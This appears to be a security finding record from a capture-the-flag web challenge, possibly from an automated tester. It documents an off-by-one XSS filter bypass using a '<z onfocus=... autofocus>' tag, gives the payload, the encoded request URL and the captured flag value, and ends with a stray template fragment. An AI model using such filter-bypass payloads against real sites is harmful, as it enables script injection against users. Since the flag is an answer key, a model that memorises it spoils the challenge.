findings.title: XSS Filter Bypass via Off-by-One Character Range (tag 'z'/'Z')
findings.description: The XSS filter on the 'name' GET parameter blocks tags starting with letters <a-y> and <A-Y> plus </. However, it has an off-by-one error and does NOT block the letter 'z' or 'Z' after <. This allows injecting arbitrary HTML elements using the tag name 'z' (e.g., <z onfocus=alert('XSS') autofocus>). The autofocus attribute causes the element to receive focus automatically on page load, triggering the onfocus event handler.
findings.evidence:
Payload: <z onfocus=alert('XSS') autofocus>
URL: http://172.17.0.1:50665/page?name=%3Cz+onfocus%3Dalert%28%27XSS%27%29+autofocus%3E

FLAG: flag{9541cc02-59a2-4171-8d30-5530ec31d825}

Server response includes: 'Congratulations! Here is the flag: flag{9541cc02-59a2-4171-8d30-5530ec31d825}'

Filter analysis:
- <a> through <y> = BLOCKED
- <A> through <Y> = BLOCKED
- </  = BLOCKED
- <z> = PASSED (off-by-one error)
- <Z> = PASSED (off-by-one error)

    GET --> Template["Flask Template\n<input ...> VALUE>"]
